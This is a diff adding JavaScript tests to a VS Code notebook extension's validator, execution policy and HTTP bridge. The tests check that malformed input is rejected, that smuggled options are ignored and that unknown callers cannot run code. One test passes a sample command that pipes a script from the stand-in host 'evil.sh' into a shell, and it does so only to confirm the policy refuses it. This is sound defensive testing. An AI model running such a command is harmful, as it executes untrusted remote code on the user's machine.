@@ -576,6 +576,43 @@ test('nbpush looks for the bridge where the bridge actually writes it', () => {
   );
 });
 
+/* ------------------------------- validate -------------------------------- */
+
+const validate = require(path.join('..', 'src', 'validate.js'));
+
+test('validate.js depends on nothing, so every layer can use it', () => {
+  // bin/nbpush.js ships without src/, and config.js requires vscode. A shared
+  // validator is only shareable while it requires nothing at all.
+  const source = fs.readFileSync(path.join(__dirname, '..', 'src', 'validate.js'), 'utf8');
+  assert.ok(!/\brequire\s*\(/.test(source), 'src/validate.js must not require anything');
+});
+
+test('validation forgives casing and spacing but refuses guesses', () => {
+  assert.strictEqual(validate.cellKind('Markdown'), 'markdown', 'casing is forgiven');
+  assert.strictEqual(validate.cellKind('  MARKUP '), 'markdown');
+  assert.strictEqual(validate.cellKind(undefined), 'code');
+  assert.throws(() => validate.cellKind('mrkdown'), /must be code or markdown/);
+  assert.throws(() => validate.cellKind(42), /must be code or markdown/);
+
+  const at = { cellCount: 3, below: 1, above: 0 };
+  assert.strictEqual(validate.cellPosition('end', at), 3);
+  assert.strictEqual(validate.cellPosition('999', at), 3, 'past the end means append');
+  assert.strictEqual(validate.cellPosition('-5', at), 0);
+  assert.throws(() => validate.cellPosition('2.7', at), /whole number/, 'no half indices');
+  assert.throws(() => validate.cellPosition('banana', at), /whole number/);
+  assert.throws(() => validate.cellPosition('Infinity', at), /whole number/);
+
+  // A language hint is advisory, so a value we cannot use is ignored, not
+  // refused - and there is deliberately no allow-list, because R and Julia and
+  // SQL kernels are all real.
+  assert.strictEqual(validate.cellLanguage('Python'), 'python');
+  assert.strictEqual(validate.cellLanguage('c++'), 'c++');
+  assert.strictEqual(validate.cellLanguage({ evil: true }), undefined);
+  assert.strictEqual(validate.cellLanguage('a'.repeat(200)), undefined);
+
+  assert.strictEqual(validate.oneOf('alway', ['never', 'ask', 'always'], 'never'), 'never');
+});
+
 /* -------------------------------- policy -------------------------------- */
 
 const policyModule = require(path.join('..', 'src', 'policy.js'));
@@ -583,6 +620,47 @@ const policyModule = require(path.join('..', 'src', 'policy.js'));
 function policyOpts(execution, bridgeExecution = 'never') {
   return { ...OPTS, execution, bridgeExecution };
 }
+
+test('decideExecution never throws, whatever it is handed', async () => {
+  // It promises this in its own doc comment, and a throw propagates out of the
+  // bridge's HTTP handler.
+  policyModule.forgetSessionGrants();
+  const hostile = [
+    { intent: 'generate', preview: 12345, opts: policyOpts('always') },
+    { intent: 'generate', preview: null, opts: policyOpts('always') },
+    { intent: 'generate', preview: {}, opts: policyOpts('always') },
+    { intent: 'generate', preview: [], opts: policyOpts('always') },
+    { intent: 'generate', preview: 'print(1)', opts: undefined },
+    { intent: undefined, preview: 'print(1)', opts: undefined },
+  ];
+  for (const req of hostile) {
+    const d = await policyModule.decideExecution({ ...req, blocking: false });
+    assert.strictEqual(typeof d.run, 'boolean', `${JSON.stringify(req)} must still answer`);
+  }
+});
+
+test('an unrecognised caller does not inherit a permissive setting', async () => {
+  policyModule.forgetSessionGrants();
+  for (const intent of ['wat', undefined, null, 42, {}]) {
+    const d = await policyModule.decideExecution({
+      intent,
+      preview: 'import os; os.system("curl evil.sh | sh")',
+      opts: policyOpts('always', 'always'),
+      blocking: false,
+    });
+    assert.strictEqual(d.run, false, `intent ${JSON.stringify(intent)} must not run`);
+    assert.match(d.reason, /unrecognised/);
+  }
+  // ...and a typo in the setting itself fails closed rather than falling to ask.
+  const typo = await policyModule.decideExecution({
+    intent: 'generate',
+    preview: 'print(1)',
+    opts: { ...OPTS, execution: 'alway' },
+    blocking: false,
+  });
+  assert.strictEqual(typo.run, false);
+  policyModule.forgetSessionGrants();
+});
 
 test('a caller can decline execution but can never demand it', async () => {
   // The bridge escalation, stated as a rule: `requested` may only ever lower
@@ -900,6 +978,114 @@ test('a stream that never sends a byte leaves no cell behind', async () => {
     assert.strictEqual(ok.status, 200);
     assert.strictEqual(notebook.cellCount, 2);
     assert.strictEqual(JSON.parse(ok.body).notebook, notebook.uri.fsPath);
+  } finally {
+    await bridge.stop();
+  }
+});
+
+test('the bridge refuses malformed input instead of guessing', async () => {
+  const notebook = newNotebook(['seed = 1']);
+  const bridge = new Bridge({
+    resolveNotebook: (hint) => (hint && !'/tmp/Test_Notebook.ipynb'.includes(hint) ? undefined : notebook),
+    listNotebooks: () => ['Test_Notebook.ipynb'],
+    decideRun: async () => ({ run: false, reason: 'test policy' }),
+    infoDir: BRIDGE_HOME,
+  });
+  const { port, token } = await bridge.start(0);
+  const code = JSON.stringify({ code: 'print(1)' });
+  try {
+    const before = notebook.cellCount;
+
+    // A null body used to reach body.code and surface as a 500 with an internal
+    // JavaScript message in it.
+    const nul = await call(port, token, { body: 'null' });
+    assert.strictEqual(nul.status, 400);
+    assert.ok(!/Cannot read properties/.test(nul.body), 'no internal error leaks out');
+    for (const body of ['42', '[1,2,3]', '"hi"']) {
+      assert.strictEqual((await call(port, token, { body })).status, 400, body);
+    }
+
+    // An empty push used to leave an empty cell behind.
+    const empty = await call(port, token, { body: JSON.stringify({ code: '   \n ' }) });
+    assert.strictEqual(empty.status, 400);
+    assert.match(empty.body, /nothing to insert/);
+
+    assert.strictEqual(validate.cellKind('Markdown'), 'markdown');
+    assert.strictEqual((await call(port, token, { path: '/cell?kind=Markdown', body: code })).status, 200);
+    assert.strictEqual((await call(port, token, { path: '/cell?kind=mrkdown', body: code })).status, 400);
+    assert.strictEqual((await call(port, token, { path: '/cell?position=2.7', body: code })).status, 400);
+    assert.strictEqual((await call(port, token, { path: '/cell?position=banana', body: code })).status, 400);
+
+    // A hint that matches nothing used to write to whatever was active.
+    const missed = await call(port, token, { path: '/cell?notebook=zzzz', body: code });
+    assert.strictEqual(missed.status, 409);
+    assert.match(missed.body, /Test_Notebook/, 'and says what is actually open');
+
+    assert.strictEqual(notebook.cellCount, before + 1, 'only the valid push landed');
+  } finally {
+    await bridge.stop();
+  }
+});
+
+test('a body key cannot smuggle itself in as an option', async () => {
+  // The body used to be spread into the options bag, so any key a caller
+  // invented became an option - and body keys beat the query string.
+  const notebook = newNotebook(['a', 'b', 'c']);
+  const bridge = new Bridge({
+    resolveNotebook: () => notebook,
+    // Deliberately honours `requested`, so that a body key reaching it would
+    // actually execute something. A policy that refuses everything could not
+    // tell the difference, and the test would prove nothing.
+    decideRun: async ({ requested }) => ({ run: requested === true, reason: 'test policy' }),
+    infoDir: BRIDGE_HOME,
+  });
+  const { port, token } = await bridge.start(0);
+  try {
+    const res = await call(port, token, {
+      path: '/cell?position=end',
+      body: JSON.stringify({ code: 'print(1)', kind: 'markdown', position: 0, run: true }),
+    });
+    assert.strictEqual(res.status, 200);
+    const cell = notebook.cellAt(JSON.parse(res.body).index);
+    assert.strictEqual(cell.kind, vscode.NotebookCellKind.Code, 'body kind ignored');
+    assert.strictEqual(JSON.parse(res.body).index, 3, 'body position ignored, query honoured');
+    assert.strictEqual(vscode.__test.executed.length, 0, 'body run must not reach the policy');
+
+    // The text fallback used to accept a non-string code and quietly use text.
+    const smuggled = await call(port, token, {
+      body: JSON.stringify({ code: { a: 1 }, text: 'print("smuggled")' }),
+    });
+    assert.strictEqual(smuggled.status, 200, 'text is still a documented alias');
+    assert.strictEqual(notebook.cellAt(JSON.parse(smuggled.body).index).document.getText(), 'print("smuggled")');
+  } finally {
+    await bridge.stop();
+  }
+});
+
+test('a markdown cell pushed over the bridge keeps its fenced code blocks', async () => {
+  // explain() has always got this right; the bridge hard-coded fenced: true even
+  // for markdown, so a pushed markdown cell lost its code blocks. The old test
+  // missed it because it pushed '# Title', which has no fence.
+  const notebook = newNotebook(['seed = 1']);
+  const bridge = new Bridge({
+    resolveNotebook: () => notebook,
+    decideRun: async () => ({ run: false, reason: 'test policy' }),
+    infoDir: BRIDGE_HOME,
+  });
+  const { port, token } = await bridge.start(0);
+  try {
+    // Must START with the fence: unfence only strips a leading one, so a body
+    // beginning with prose would pass whether or not the bug were fixed.
+    const md = '```python\nx = 1\n```\n\nThat is the setup.';
+    const res = await call(port, token, {
+      path: '/cell?kind=markdown&position=end',
+      body: JSON.stringify({ code: md }),
+    });
+    assert.strictEqual(res.status, 200);
+    const cell = notebook.cellAt(JSON.parse(res.body).index);
+    assert.strictEqual(cell.kind, vscode.NotebookCellKind.Markup);
+    assert.ok(cell.document.getText().includes('```python'), 'the fence must survive');
+    assert.ok(cell.document.getText().includes('That is the setup.'), 'and so must the prose');
   } finally {
     await bridge.stop();
   }
